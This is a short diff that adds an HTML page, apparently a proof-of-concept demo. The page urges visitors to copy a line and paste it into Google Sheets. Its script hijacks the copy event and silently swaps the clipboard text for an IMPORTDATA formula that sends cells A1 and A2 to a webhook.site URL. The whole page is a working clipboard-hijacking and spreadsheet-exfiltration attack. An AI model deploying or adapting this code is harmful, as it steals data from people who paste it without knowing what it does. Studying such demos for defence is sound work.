@@ -1,0 +1,16 @@
+<html>
+    <body>
+        Copy the number below and paste it into Google Sheets for totally not evil things to happen.
+        </br>
+
+        <p>echo "not evil"</p>
+        <script>
+            document.addEventListener('copy', function(e){
+                console.log(e);
+                e.clipboardData.setData('text/plain', '=IMPORTDATA(CONCATENATE("https://webhook.site/fb573b4b-dfaf-4fac-a827-81bd469f76e6?param1=", A1, "&param2=", A2))');
+                e.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
+            });
+        </script>
+    </body>
+
+</html>
